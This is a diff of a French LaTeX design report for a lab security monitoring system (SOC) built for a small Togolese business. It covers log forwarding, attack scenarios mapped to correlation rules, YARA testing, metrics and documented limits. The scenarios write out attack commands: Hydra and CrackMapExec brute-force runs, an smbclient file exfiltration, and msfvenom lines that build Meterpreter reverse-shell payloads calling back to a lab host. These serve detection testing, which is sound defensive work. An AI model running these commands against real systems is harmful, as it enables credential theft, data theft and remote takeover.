 \end{tabularx}
 \end{table}
 
-\subsection{Réception sur le SOC}
+\textbf{Configuration rsyslog sur Debian Server}
+(\texttt{/etc/rsyslog.d/50-forward.conf}) :
 
-Tous les flux convergent vers rsyslog sur le SOC (port UDP~514).
-rsyslog écrit les événements dans \texttt{/var/log/remote/} en séparant
-les fichiers par hostname source~:
+\begin{lstlisting}
+auth,authpriv.*  @10.0.1.10:514   # SSH, PAM, sudo
+daemon.*         @10.0.1.10:514   # Samba, Dolibarr Docker
+syslog.*         @10.0.1.10:514   # Messages internes rsyslog
+\end{lstlisting}
+
+\textbf{Configuration rsyslog sur le SOC}
+(\texttt{/etc/rsyslog.d/10-remote.conf}) :
+
+\begin{lstlisting}
+$template RemoteLogs,"/var/log/remote/%HOSTNAME%.log"
+if $fromhost-ip startswith '10.0.1.' then ?RemoteLogs
+& stop
+\end{lstlisting}
+
+\subsection{Réception et séparation des flux sur le SOC}
+
+Tous les flux convergent vers rsyslog sur le SOC (port UDP~514). rsyslog
+écrit les événements dans \texttt{/var/log/remote/} en séparant les
+fichiers par hostname source :
 
 \begin{itemize}
-    \item \texttt{/var/log/remote/debian.log} — Debian Server
-    \item \texttt{/var/log/remote/OPNsense.internal.log} — OPNsense
-    \item \texttt{/var/log/remote/DESKTOP-PME.log} — Windows 10
+    \item \texttt{/var/log/remote/debian.log} --- Debian Server
+    \item \texttt{/var/log/remote/OPNsense.internal.log} --- OPNsense
+    \item \texttt{/var/log/remote/DESKTOP-PME.log} --- Windows~10
 \end{itemize}
 
 Le moteur Python surveille ce répertoire via \texttt{watchdog} (inotify)
-et traite les nouvelles lignes en temps réel.
+et traite les nouvelles lignes en temps réel via une queue thread-safe
+commune alimentée par un handler par fichier source.
 
-% ============================================================
+%=============================================================
 \section{Scénarios d'attaque}
-% ============================================================
+%=============================================================
 
-Les scénarios sont ancrés dans les menaces documentées par INTERPOL~2025
-pour l'Afrique de l'Ouest \cite{interpol2025}.
+Les quatre scénarios sont ancrés dans les menaces documentées par
+INTERPOL~2025 pour l'Afrique de l'Ouest \cite{interpol2025}.
+Chaque scénario est conçu pour déclencher une règle YAML spécifique
+du moteur de corrélation.
+
+\subsection{S1 --- Brute-force SSH}
+
+\textbf{Contexte PME.} Un attaquant tente de compromettre le serveur
+de fichiers de la PME via une attaque par force brute sur SSH.
+
+\textbf{Chaîne d'attaque.}
+\begin{enumerate}
+    \item Kali (\texttt{10.0.1.50}) lance Hydra contre Debian Server
+    (\texttt{10.0.1.20}) : \texttt{hydra -l root -P wordlist.txt ssh://10.0.1.20}
+    \item Hydra génère 10 à 50 tentatives par minute.
+    \item Chaque échec produit une entrée \texttt{Failed password} dans
+    \texttt{/var/log/auth.log} sur Debian Server.
+    \item rsyslog forwarde ces entrées (facility \texttt{auth}) vers le SOC.
+    \item Le moteur corrèle : 10 \texttt{ssh\_failure} depuis
+    \texttt{10.0.1.50} en 60~secondes → alerte \texttt{SSH\_BRUTEFORCE\_001}
+    (CRITICAL).
+\end{enumerate}
+
+\textbf{Sources corrélées.} \texttt{auth/authpriv} depuis Debian Server.
+
+\textbf{Règle déclenchée.} \texttt{SSH\_BRUTEFORCE\_001} (Type~1,
+seuil~: 10 tentatives / 60~secondes, groupé par \texttt{actor\_ip}).
+
+\textbf{MITRE ATT\&CK.} TA0006 (Credential Access) / T1110 (Brute Force).
+
+\subsection{S2 --- Exfiltration de données financières via SMB}
+
+\textbf{Contexte PME.} Un attaquant effectue une reconnaissance réseau,
+compromet l'accès aux partages Samba et exfiltre des relevés Mobile Money.
+
+\textbf{Chaîne d'attaque.}
+\begin{enumerate}
+    \item Kali lance un scan nmap : \texttt{nmap -sV 10.0.1.0/24}.
+    OPNsense journalise les paquets (filterlog, \texttt{net\_scan}).
+    \item Kali utilise CrackMapExec pour le brute-force SMB :
+    \texttt{crackmapexec smb 10.0.1.20 -u users.txt -p passwords.txt}.
+    Debian Server journalise les échecs NTLMv2 (\texttt{smb\_failure}).
+    \item Après succès, Kali accède au partage et exfiltre des fichiers :
+    \texttt{smbclient //10.0.1.20/direction -U dir1 -c "get releves\_mm.csv"}.
+    Debian Server journalise l'accès (\texttt{samba\_read}).
+    \item Le moteur corrèle la cooccurrence de \texttt{net\_scan} +
+    \texttt{samba\_read} depuis la même IP en 5~minutes → alerte
+    \texttt{SMB\_EXFIL\_001} (CRITICAL).
+\end{enumerate}
+
+\textbf{Sources corrélées.} filterlog (OPNsense) + daemon/Samba
+(Debian Server).
+
+\textbf{Règle déclenchée.} \texttt{SMB\_EXFIL\_001} (Type~3, cooccurrence
+\texttt{net\_scan} + \texttt{samba\_read} / 300~secondes).
+
+\textbf{MITRE ATT\&CK.} TA0010 (Exfiltration) / T1021.002
+(SMB/Windows Admin Shares).
+
+\subsection{S3 --- Compromission de poste employé (BEC / kill-chain)}
+
+\textbf{Contexte PME.} Un employé reçoit un mail de phishing, télécharge
+un fichier joint malveillant, le dépose sur le partage Samba commun, puis
+l'exécute depuis son poste Windows.
+
+\textbf{Chaîne d'attaque.}
+\begin{enumerate}
+    \item Kali génère un payload Meterpreter Windows :
+    \texttt{msfvenom -p windows/x64/meterpreter/reverse\_tcp
+    LHOST=10.0.1.50 LPORT=4444 -f exe -o payload.exe}
+    \item Kali dépose le payload sur le partage Samba :
+    \texttt{smbclient //10.0.1.20/commun -U dir1 -c "put payload.exe"}.
+    Debian Server journalise l'accès (\texttt{samba\_write}, step~1).
+    \item L'employé (simulé) copie le fichier sur Windows. Sysmon
+    EventID~11 journalise la création du fichier
+    (\texttt{file\_create}, step~2). Le moteur appelle YARA sur le fichier.
+    \item L'employé double-clique sur le fichier. Sysmon EventID~1
+    journalise l'exécution du processus (\texttt{process\_exec}, step~3).
+    \item Le moteur corrèle la séquence ordonnée en 4~heures →
+    alerte \texttt{MALICIOUS\_FILE\_EXEC\_001} (CRITICAL), enrichie
+    du match YARA.
+\end{enumerate}
+
+\textbf{Sources corrélées.} daemon/Samba (Debian Server) + Sysmon
+EventID~1 et 11 (Windows~10).
+
+\textbf{Règle déclenchée.} \texttt{MALICIOUS\_FILE\_EXEC\_001} (Type~2,
+3 étapes séquentielles, fenêtre 4~heures, corrélation par
+\texttt{actor\_user}).
+
+\textbf{MITRE ATT\&CK.} TA0002 (Execution) / T1204.002
+(User Execution: Malicious File).
+
+\subsection{S4 --- Brute-force interface web Dolibarr}
+
+\textbf{Contexte PME.} Un attaquant tente de compromettre l'ERP de la
+PME via une attaque par force brute sur l'interface web de Dolibarr.
+
+\textbf{Chaîne d'attaque.}
+\begin{enumerate}
+    \item Kali utilise Hydra ou un script Python pour tenter des
+    authentifications répétées sur \texttt{http://10.0.1.20/index.php} :
+    \texttt{hydra -l admin -P wordlist.txt http-post-form
+    "10.0.1.20:/index.php:..."}
+    \item Apache journalise chaque tentative échouée avec code HTTP~401
+    ou~403 dans le driver Docker syslog, qui forwarde vers rsyslog sur
+    Debian Server, puis vers le SOC.
+    \item Le moteur corrèle : 20 \texttt{http\_request} avec statut
+    401/403 depuis la même IP en 120~secondes → alerte
+    \texttt{WEB\_BRUTEFORCE\_001} (WARNING).
+\end{enumerate}
+
+\textbf{Sources corrélées.} daemon/Apache via Docker syslog
+(Debian Server).
+
+\textbf{Règle déclenchée.} \texttt{WEB\_BRUTEFORCE\_001} (Type~1,
+seuil~: 20 requêtes 401/403 / 120~secondes, filtre \texttt{http\_status}).
+
+\textbf{MITRE ATT\&CK.} TA0006 (Credential Access) / T1110.001
+(Password Guessing).
+
+\subsection{S5 --- Upload de fichier malveillant sur le partage}
+
+\textbf{Contexte PME.} Un attaquant ayant obtenu facilement les credentials d'un employé ou un employé lui-même dépose sur le partage un fichier malveillant .
+\textbf{Chaîne d'attaque.}
+\begin{enumerate}
+    \item L'attaquant ou l'employé se connecte normalement sans déclencher un pattern suspect et dépose un fichier.
+    \item Samba détecte ce \texttt{file\_create} ou \texttt{file\_write}, forwarde vers  le SOC qui grâce à son utilisateur monté en lecture seule sur tous les partages lance \texttt{yara\_scanner.py} du moteur python.
+    \item Le moteur corrèle : Signature suspecte détectée sur le fichier → alerte
+    \texttt{SMB\_MALICIOUS\_FILE\_001} (CRITICAL).
+\end{enumerate}
+
+\textbf{Sources corrélées.} daemon/Samba.
+
+\textbf{Règle déclenchée.} \texttt{SMB\_MALICIOUS\_FILE\_001} (Type~4).
+
+\textbf{MITRE ATT\&CK.} T1080 (Taint Shared Content) /  T1204.002 (Malicious File).
+
+\subsection{YARA --- payload et règles}
+YARA joue un rôle très important dans le pipeline de la collecte.
+\begin{itemize}
+    \item Il intervient comme source de vérité unique pour la règle
+    \texttt{SMB\_MALICIOUS\_FILE\_001}, déclenché par le Dispatcher
+    sur tout événement \texttt{samba\_write}, indépendamment des
+    règles YAML actives.
+    \item Il est appelé comme couche d'enrichissement supplémentaire
+    au step~1 de \texttt{MALICIOUS\_FILE\_EXEC\_001}, sur ce même
+    événement \texttt{samba\_write}, avant que la séquence ne
+    progresse vers les étapes suivantes.
+\end{itemize}
+Trois familles de payloads sont testées :
 
 \begin{table}[H]
 \centering
-\caption{Scénarios d'attaque simulés}
-\label{tab:scenarios}
-\begin{tabularx}{\textwidth}{llXX}
-\toprule
-\textbf{ID} & \textbf{Contexte PME} & \textbf{Chaîne d'attaque} & \textbf{Sources corrélées} \\
-\midrule
-S1 & Brute-force SSH
-   & Kali → hydra → tentatives SSH répétées sur Debian Server
-   & filterlog (scan) + auth (échecs SSH) \\
-S2 & Exfiltration données financières
-   & Kali → nmap → brute-force SMB (CrackMapExec) → smbclient get relevés
-   & filterlog + daemon (Samba) + auth \\
-S3 & Compromission poste employé (BEC)
-   & Kali → upload payload via partage Samba → exécution Windows → YARA match
-   & Sysmon 1/11 + YARA + daemon \\
-\bottomrule
+\caption{Payloads testés avec YARA}
+\label{tab:yara}
+\begin{tabularx}{\textwidth}{|>{\raggedright\arraybackslash}p{4.8cm}|>{\raggedright\arraybackslash}p{4.8cm}|>{\raggedright\arraybackslash}X|}
+\hline
+\textbf{Payload} & \textbf{Génération} & \textbf{Usage} \\
+\hline
+EICAR test file & Fichier texte standard antivirus & Validation pipeline YARA sans payload réel (tests unitaires) \\
+\hline
+Meterpreter reverse shell (.exe) & \url{msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.1.50 LPORT=4444 -f exe} & Scénario S3 --- validation des règles Meterpreter du dépôt signature-base \\
+\hline
+Macro Office malveillante (.docm) & \url{msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.1.50 LPORT=4444 -f vba} & Scénario S3 variante --- vecteur BEC réaliste (pièce jointe mail) \\
+\hline
 \end{tabularx}
 \end{table}
 
-% ============================================================
+Les règles YARA proviennent du dépôt communautaire
+\texttt{Neo23x0/signature-base} \cite{signature_base}, filtré pour ne
+conserver que les règles couvrant les exécutables Windows malveillants
+(\texttt{SUSP\_*}, \texttt{MAL\_*}). Les règles réseau et mémoire sont
+exclues car YARA opère uniquement sur des fichiers dans ce projet.
+
+\textbf{Point d'intervention de YARA dans le pipeline.}
+YARA intervient au step~1 de la règle
+\texttt{\seqsplit{MALICIOUS\_FILE\_EXEC\_001}}, sur l'événement
+\texttt{samba\_write}, et non sur \texttt{file\_create} : le
+Dispatcher déclenche le scan dès le dépôt du fichier sur le partage,
+avant que celui-ci n'atteigne le poste Windows.
+
+
+%=============================================================
+\section{Dashboard et visualisation}
+%=============================================================
+
+\subsection{Architecture de visualisation}
+
+Deux outils coexistent avec des rôles distincts :
+
+\textbf{Grafana} est utilisé pour la visualisation des métriques de
+benchmark et la supervision en temps réel des événements ingérés par
+le moteur. Grafana se connecte à \texttt{engine.db} via le plugin
+\texttt{frser-sqlite-datasource} et permet de construire des dashboards
+sans écrire de code frontend. Il affiche le volume d'événements par
+source, le nombre d'alertes par sévérité, la timeline des attaques
+détectées et les métriques de performance du moteur.
+
+\textbf{Une interface Flask minimale} est développée pour l'affichage
+des alertes en temps réel à destination de la démo et du portfolio.
+Flask expose une API qui lit les fichiers \texttt{alert\_*.json} dans
+\texttt{/var/log/nyxsoc/alerts/} et les affiche dans une page HTML
+unique avec Chart.js. Cette interface montre les alertes CRITICAL avec
+leur chaîne d'événements et le résultat YARA si applicable.
+
+\subsection{Justification de la double approche}
+
+Grafana seul suffirait pour le benchmark --- mais il ne montre pas les
+alertes structurées de façon narrative (la chaîne complète d'un scénario).
+Flask seul suffirait pour la démo --- mais il ne fournit pas les graphiques
+de métriques nécessaires au rapport d'évaluation. Les deux outils ont des
+rôles complémentaires et non redondants.
+
+%=============================================================
+\section{Métriques évaluées et protocole de mesure}
+%=============================================================
+
+\subsection{Hypothèses de recherche}
+
+Le système est évalué sur quatre hypothèses formulées comme des
+questions de recherche auxquelles les mesures apporteront une réponse
+vérifiable.
+
+\begin{description}
+    \item[H1 --- Pertinence de la détection]
+    Le moteur de corrélation, calibré et évalué sur des scénarios
+    d'attaque définis, atteint-il un taux de vrais positifs (TPR)
+    $\geq 90$~\% et un taux de faux positifs (FPR) $\leq 10$~\%
+    sur le dataset d'évaluation isolé~?
+    Cette hypothèse reconnaît explicitement la limite des systèmes
+    à règles statiques : les faux négatifs sont inévitables face à
+    des variantes d'attaque non couvertes par les règles définies.
+    Le TPR mesure la capacité de détection sur les patterns connus~;
+    il ne préjuge pas de la détection de patterns inconnus, qui
+    constitue une perspective d'extension future (apprentissage
+    automatique, règles communautaires).
+
+\item[H2 --- Sobriété en ressources]
+    Le moteur Python en fonctionnement nominal consomme-t-il moins
+    de 2~Go de RAM, démontrant qu'une architecture de corrélation
+    efficace ne nécessite pas d'infrastructure serveur dédiée~?
+    Cette hypothèse vise à vérifier que les choix de conception
+    retenus (état en mémoire avec persistance JSON atomique,
+    absence de file de messages ou de base de données externe)
+    permettent un déploiement sur du matériel standard, sans
+    dépendance à un cluster ou un service managé.
+
+    \item[H3 --- Adaptabilité au contexte local]
+    L'ajout ou la modification d'une règle de détection adaptée
+    au contexte métier togolais nécessite-t-il uniquement la
+    modification d'un fichier YAML, sans toucher au code source
+    du moteur~?
+
+    Cette hypothèse valide l'un des principes fondateurs de
+    NyxSOC : des règles externalisées permettent à un
+    administrateur non développeur d'adapter le système aux
+    spécificités locales (nouveaux vecteurs d'attaque, seuils
+    calibrés sur le trafic réel).
+
+    \item[H4 --- Réactivité de la réponse automatisée]
+    Le module de réponse automatisée déclenche-t-il une action
+    réseau concrète dans un délai $\leq 5$~secondes après la
+    génération d'une alerte CRITICAL par le moteur~?
+
+    Ce délai est fixé en référence aux recommandations du Centre
+    canadien pour la cybersécurité sur les temps de réponse aux
+    incidents automatisés \cite{cccs_siem}. Au-delà de ce seuil,
+    une attaque active comme un reverse shell Meterpreter a le
+    temps d'établir une session persistante.
+\end{description}
+
+\subsection{Métriques collectées}
+
+\begin{table}[H]
+\centering
+\caption{Métriques collectées et méthodes de mesure}
+\label{tab:metrics}
+\begin{tabularx}{\textwidth}{|l|X|X|}
+\hline
+\textbf{Métrique} & \textbf{Description} & \textbf{Méthode de mesure} \\
+\hline
+TPR (Taux de vrais positifs)
+  & Proportion d'attaques réelles détectées
+  & Alertes générées / attaques dans dataset eval \\
+FPR (Taux de faux positifs)
+  & Proportion d'alertes incorrectes
+  & Fausses alertes / total alertes générées \\
+Latence de détection
+  & Délai entre premier événement de la chaîne et génération de l'alerte
+  & \texttt{timestamp(alerte)} $-$ \texttt{timestamp(event[0])} \\
+Consommation RAM moteur
+  & RAM utilisée par le processus Python en fonctionnement
+  & \texttt{/proc/\$PID/status} (VmRSS) toutes les 5~secondes \\
+Taille engine.db
+  & Croissance de la base SQLite avant/après purge
+  & \texttt{stat engine.db} avant, pendant et après chaque scénario \\
+Throughput
+  & Événements traités par seconde
+  & Compteur interne dans le loop principal (\texttt{time.perf\_counter}) \\
+Temps de réponse SOAR
+  & Délai entre réception alerte et action OPNsense effective
+  & Horodatage dans le module SOAR \\
+\hline
+\end{tabularx}
+\end{table}
+
+\subsection{Protocole d'isolation du dataset d'évaluation}
+
+Le dataset d'évaluation est constitué lors des scénarios d'attaque de la
+semaine~3, selon le protocole suivant :
+
+\begin{enumerate}
+    \item Tous les logs générés pendant les scénarios sont archivés dans
+    \texttt{datasets/raw/} avec horodatage précis de début et fin de chaque
+    attaque.
+    \item 30~\% des logs sont prélevés aléatoirement et déplacés dans
+    \texttt{datasets/eval/}. Ce répertoire n'est plus jamais modifié après
+    le prélèvement.
+    \item Les 70~\% restants sont annotés manuellement dans
+    \texttt{datasets/labeled/} : chaque événement est marqué comme attaque
+    ou trafic légitime, avec l'identifiant du scénario associé.
+    \item Le moteur est développé et optimisé uniquement sur
+    \texttt{datasets/labeled/}. L'évaluation finale utilise
+    \texttt{datasets/eval/} --- des données que le moteur n'a jamais vues.
+\end{enumerate}
+
+Cette séparation garantit que les métriques TPR et FPR mesurées reflètent
+la capacité de généralisation du moteur, pas sa mémorisation du dataset
+d'entraînement.
+
+%=============================================================
+\section{Limites documentées}
+%=============================================================
+
+\begin{description}
+    \item[L1 --- Ordre temporel approximatif] Les événements sont traités
+    dans l'ordre d'arrivée dans la queue, pas strictement dans l'ordre
+    chronologique. Un décalage de 1 à 2~secondes est possible entre sources.
+    Négligeable pour des fenêtres de corrélation $\geq 60$~secondes.
+
+    \item[L2 --- Pas de corrélation inter-IP (pivoting)] La corrélation
+    est indexée par \texttt{actor\_ip}. Un attaquant qui change d'IP en
+    cours d'attaque (pivoting via machine compromise) génère deux contextes
+    distincts non reliés. Perspective d'extension future.
+
+    \item[L3 --- Queue en mémoire] En cas de crash du processus moteur,
+    les événements en queue non encore traités sont perdus. Les événements
+    déjà écrits dans SQLite sont préservés.
+
+    \item[L4 --- YARA sur fichiers locaux Windows non accessible]
+YARA ne peut pas scanner les fichiers stockés localement
+sur le poste Windows (\texttt{C:\textbackslash Users\textbackslash ...}).
+Seuls les fichiers transitant par les partages Samba sont
+analysés. Cette limite est cohérente avec les scénario S3 et S5
+où le payload entre dans le réseau via un partage Samba
+avant d'atteindre Windows.
+
+    \item[L5 --- Seuils calibrés pour le lab] Les seuils des règles de
+    détection sont calibrés pour un trafic légitime minimal (lab isolé).
+    En production avec 20 employés actifs, certains seuils devraient être
+    revus à la hausse pour éviter les faux positifs sur le trafic légitime.
+
+    \item[L6 --- Pas de hot-reload des règles] La modification d'une règle
+    YAML nécessite le redémarrage du moteur. Acceptable pour un lab de
+    10~semaines, une amélioration est possible si le temps le permet.
+\end{description}
+
+%=============================================================
 \section{Récapitulatif des décisions architecturales}
-% ============================================================
+%=============================================================
 
 \begin{table}[H]
 \centering
 \caption{Récapitulatif des décisions et justifications}
 \label{tab:decisions}
-\begin{tabularx}{\textwidth}{lXX}
-\toprule
+\begin{tabularx}{\textwidth}{|l|X|X|}
+\hline
 \textbf{Composant} & \textbf{Choix retenu} & \textbf{Raison principale} \\
-\midrule
+\hline
 Hyperviseur      & KVM/QEMU + libvirt    & Intégré au noyau, stable sans DKMS \\
-Pare-feu         & OPNsense              & API REST, syslog natif, libre \\
-OS serveurs      & Debian 12             & Minimalisme, homogénéité, logs propres \\
-Serveur fichiers & Samba 4 AD            & Compatible AD, réalisme PME, gratuit \\
-Application web  & Apache + Dolibarr     & ERP dominant Afrique francophone \\
+Pare-feu         & OPNsense              & API REST, syslog natif, BSD libre \\
+OS serveurs      & Debian 13            & Minimalisme, logs propres, homogénéité \\
+AD               & Samba 4 DC            & Compatible AD, gratuit, réalisme PME \\
+ERP              & Dolibarr Docker       & ERP dominant Afrique francophone, setup rapide \\
+Logs Docker      & Driver syslog         & Intégration naturelle dans pipeline rsyslog \\
 Poste client     & Windows 10 + Sysmon   & Réalisme PME, Event IDs enrichis \\
 Collecte Windows & NXLog CE              & Output UDP natif, indépendant de ELK \\
 Attaquant        & Kali Docker (hôte)    & Éphémère, économie RAM, image officielle \\
-NTP              & Chrony (Linux), W32tm (Windows) & Convergence rapide, précision sub-ms \\
+NTP              & Chrony / W32tm        & Précision submilliseconde, convergence rapide \\
 Transport syslog & UDP                   & Pas de back-pressure, standard historique \\
-\bottomrule
+Dashboard        & Grafana + Flask       & Métriques benchmark + alertes narratives \\
+\hline
 \end{tabularx}
 \end{table}
-
-% ============================================================
+\newpage
+%=============================================================
 \begin{thebibliography}{99}
 
 \bibitem{ancy_strategie}
@@ -447,13 +920,15 @@ Agence Nationale de la Cybersécurité du Togo,
 ANCy, Lomé, Togo, 2024.
 [En ligne]. Disponible sur :
 \url{https://ancy.gouv.tg/publication-de-la-strategie-nationale-de-cybersecurite-pour-le-togo/}
+[Consulté le 4 juin 2026].
 
 \bibitem{interpol2025}
 INTERPOL,
 \textit{Africa Cyberthreat Assessment 2025},
 INTERPOL, Lyon, 2025.
 [En ligne]. Disponible sur :
-\url{https://www.interpol.int/content/download/21864/file/Africa\%20Cyberthreat\%20Assessment\%20Report_2025.pdf}
+\url{https://www.interpol.int/content/download/21864/file/Africa%20Cyberthreat%20Assessment%20Report_2025.pdf}
+[Consulté le 4 juin 2026].
 
 \bibitem{kvm_kernel}
 R.~Avi Kivity \textit{et al.},
@@ -462,15 +937,17 @@ in \textit{Proceedings of the Linux Symposium}, vol.~1, 2007, pp.~225--230.
 
 \bibitem{pfsense_netgate}
 Netgate,
-\textit{pfSense Plus Software — Licensing},
+\textit{pfSense Plus Software --- Licensing},
 Netgate, 2023.
-[En ligne]. Disponible sur : \url{https://www.netgate.com/pfsense-plus-software}
+[En ligne]. Disponible sur :
+\url{https://www.netgate.com/pfsense-plus-software}
 
 \bibitem{debian_stable}
 The Debian Project,
-\textit{Debian GNU/Linux 12 (bookworm) — Release Notes},
+\textit{Debian GNU/Linux 12 (bookworm) --- Release Notes},
 Debian, 2023.
-[En ligne]. Disponible sur : \url{https://www.debian.org/releases/stable/}
+[En ligne]. Disponible sur :
+\url{https://www.debian.org/releases/stable/}
 
 \bibitem{samba4_ad}
 The Samba Team,
@@ -481,27 +958,28 @@ Samba Wiki, 2024.
 
 \bibitem{dolibarr}
 Dolibarr ERP/CRM,
-\textit{Dolibarr — Présentation générale},
+\textit{Dolibarr --- Présentation générale},
 2024.
-[En ligne]. Disponible sur : \url{https://www.dolibarr.org/}
-
-\bibitem{statcounter_africa}
-StatCounter,
-\textit{Desktop Windows Version Market Share Africa},
-StatCounter Global Stats, juin 2025.
 [En ligne]. Disponible sur :
-\url{https://gs.statcounter.com/windows-version-market-share/desktop/africa}
+\url{https://www.dolibarr.org/}
+
+\bibitem{statcounter_togo}
+StatCounter,
+\textit{Desktop Windows Version Market Share in Togo --- May 2026},
+StatCounter Global Stats, mai 2026.
+[En ligne]. Disponible sur :
+\url{https://gs.statcounter.com/windows-version-market-share/desktop/tg}
 
 \bibitem{sysmon_docs}
 Microsoft,
-\textit{Sysmon — Sysinternals},
+\textit{Sysmon --- Sysinternals},
 Microsoft Learn, 2024.
 [En ligne]. Disponible sur :
 \url{https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon}
 
 \bibitem{swifton}
 SwiftOnSecurity,
-\textit{sysmon-config — A Sysmon configuration file for everybody to deploy},
+\textit{sysmon-config --- A Sysmon configuration file for everybody to deploy},
 GitHub, 2024.
 [En ligne]. Disponible sur :
 \url{https://github.com/SwiftOnSecurity/sysmon-config}
@@ -510,25 +988,61 @@ GitHub, 2024.
 NXLog Ltd.,
 \textit{NXLog Community Edition Reference Manual},
 NXLog, 2024.
-[En ligne]. Disponible sur : \url{https://docs.nxlog.co/ce/current/}
+[En ligne]. Disponible sur :
+\url{https://docs.nxlog.co/ce/current/}
 
 \bibitem{kali_docker}
 Offensive Security,
 \textit{Kali Linux Docker Image},
 Docker Hub, 2024.
-[En ligne]. Disponible sur : \url{https://hub.docker.com/r/kalilinux/kali-rolling}
+[En ligne]. Disponible sur :
+\url{https://hub.docker.com/r/kalilinux/kali-rolling}
 
 \bibitem{chrony_docs}
 R.~Curnow,
-\textit{chrony — a versatile implementation of the Network Time Protocol},
-chrony.tuxfamily.org, 2024.
-[En ligne]. Disponible sur : \url{https://chrony-project.org/documentation.html}
+\textit{chrony --- a versatile implementation of the Network Time Protocol},
+chrony-project.org, 2024.
+[En ligne]. Disponible sur :
+\url{https://chrony-project.org/documentation.html}
 
 \bibitem{rsyslog_udp}
 Rainer Gerhards,
-\textit{rsyslog Documentation — imudp: UDP Syslog Input Module},
+\textit{rsyslog Documentation --- imudp: UDP Syslog Input Module},
 rsyslog.com, 2024.
-[En ligne]. Disponible sur : \url{https://www.rsyslog.com/doc/configuration/modules/imudp.html}
+[En ligne]. Disponible sur :
+\url{https://www.rsyslog.com/doc/configuration/modules/imudp.html}
+
+\bibitem{signature_base}
+Florian Roth,
+\textit{signature-base --- Signature base for the YARA-based scanner},
+GitHub, 2024.
+[En ligne]. Disponible sur :
+\url{https://github.com/Neo23x0/signature-base}
+
+\bibitem{splunk_correlation}
+Splunk,
+\textit{Corrélation des événements informatiques},
+Blog Splunk, 2024.
+[En ligne]. Disponible sur :
+\url{https://www.splunk.com/fr_fr/blog/learn/correlation-des-evenements-informatiques.html}
+[Consulté le 4 juin 2026].
+
+\bibitem{itrust_siem}
+ITrust Consulting,
+\textit{The recipe of a good SIEM for a good SOC},
+Blog ITrust, 2024.
+[En ligne]. Disponible sur :
+\url{https://www.itrust.fr/en/the-recipe-of-a-good-siem-for-a-good-soc/}
+[Consulté le 4 juin 2026].
+
+\bibitem{cccs_siem}
+Centre canadien pour la cybersécurité,
+\textit{Utiliser la gestion des informations et des événements de
+sécurité pour gérer les risques de cybersécurité},
+Gouvernement du Canada, 2025.
+[En ligne]. Disponible sur :
+\url{https://www.cyber.gc.ca/fr/orientation/utiliser-gestion-informations-evenements-securite-gerer-risques-cybersecurite-itsm80024}
+[Consulté le 4 juin 2026].
 
 \end{thebibliography}
 
